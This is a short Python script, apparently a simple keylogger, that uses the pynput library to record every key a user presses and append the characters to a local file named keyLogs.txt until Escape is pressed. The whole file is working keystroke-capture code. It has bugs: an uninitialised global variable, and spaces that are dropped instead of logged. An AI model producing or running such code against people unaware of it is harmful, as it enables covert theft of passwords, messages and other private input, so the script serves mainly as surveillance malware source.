import pynput

from pynput.keyboard import Listener, Key


def keyPressed(key):
    global lines
    with open("keyLogs.txt", 'a') as logKey:
        try:
            if key == Key.enter:
                logKey.write("\n")
                lines = ""
            elif key == Key.space:
                lines += " "
            elif key == Key.esc:    
                return False
            else:
                lines = key.char
                logKey.write(lines)
                lines = ""
        except:
            print("Invalid char")


if __name__ == "__main__":
    with Listener(on_press=keyPressed) as listener:
        listener.join()
        input()
